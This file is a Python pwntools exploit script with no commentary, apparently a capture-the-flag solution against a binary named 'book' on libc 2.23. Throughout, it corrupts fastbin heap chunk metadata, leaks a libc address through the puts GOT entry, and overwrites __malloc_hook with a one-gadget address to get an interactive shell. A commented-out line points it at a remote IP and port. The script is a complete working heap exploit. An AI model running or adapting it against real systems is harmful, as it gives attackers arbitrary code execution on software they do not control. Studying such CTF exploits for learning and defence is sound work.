
from pwn import *

p=process("./book")
#p=remote("159.65.68.241","10004")
libc = ELF("./libc-2.23.so",checksec=False)
malloc_hook = libc.symbols["__malloc_hook"]
def add(name,size,content):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("name?",name)
    p.sendlineafter("name?",str(size))
    p.sendlineafter("book",content)

def delete(index):
    p.sendlineafter("choice:","2")
    p.sendlineafter("sell?",str(index))

def read(index):
    p.sendlineafter("choice:","3")
    p.sendlineafter("sell?",str(index))

code = ELF("./book",checksec=False)
puts_got = code.got["puts"]


add("1",0,"a")      #0
add("2",0x40,"b")  #1
add("fence",0,p64(0xdeadbeef))  #2

delete(1)
delete(0)

add(p64(0x51)*2,0,"a"*0x18+p64(0x51)+p64(0x602060))  #0
add("b",0x40,"b")        #1
add("c",0x40,"c"*0x10+p64(puts_got))  #3



read(0)
p.recvuntil("name:")
puts_addr = p.recv(6)+"\x00"*2
puts_addr = u64(puts_addr)
libc_base = puts_addr - libc.symbols["puts"]
print(hex(libc_base))
print("-------------------")

add("d",0,"d")       #4
add("e",0x50,"e")    #5
add("fence",0,p64(0xdeadbeef))  #6

#gdb.attach(p)
delete(5) 
delete(4)
#gdb.attach(p)

add("d",0,"d"*0x18+p64(0x61)+p64(0x51)+"123")  #4
add("e",0x50,"e")    #5
#gdb.attach(p)
add("g",0,"d")       #6
add("h",0x40,"e")    #7
#gdb.attach(p)
add("fence",0,p64(0xdeadbeef))  #8
#gdb.attach(p)

delete(8)
delete(7)

add("g",0,"g"*0x18+p64(0x51)+p64(libc_base+0x3c4b40)+"123")  #8
#gdb.attach(p)
add("h",0x40,"g")   #7
print hex(libc_base+0x3c4b40)

#gdb.attach(p)
add("i",0x40,p64(0)*5+p64(libc_base+0x3c4b00))  #9
#gdb.attach(p)
add("exp",0,p64(libc_base+0x4526a))   #10
print hex(libc_base+0x4526a)
#gdb.attach(p)

p.sendlineafter("choice:", "1")
p.sendlineafter("name?","aaa")
p.sendlineafter("name?","0")
p.interactive()



